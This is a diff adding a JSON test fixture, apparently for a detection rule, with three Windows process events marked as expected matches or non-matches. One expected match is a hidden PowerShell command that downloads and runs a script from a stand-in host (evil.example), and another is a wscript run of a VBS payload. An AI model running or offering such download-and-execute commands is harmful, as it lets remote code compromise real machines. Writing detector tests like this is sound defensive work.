@@ -1,0 +1,5 @@
+[
+  {"expect_match": true, "event": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -nop -w hidden -c Invoke-Expression (New-Object Net.WebClient).DownloadString('https://evil.example/stage2.ps1')"}},
+  {"expect_match": true, "event": {"Image": "C:\\Windows\\System32\\wscript.exe", "CommandLine": "wscript.exe payload.vbs FromBase64String"}},
+  {"expect_match": false, "event": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -Command Get-Process"}}
+]
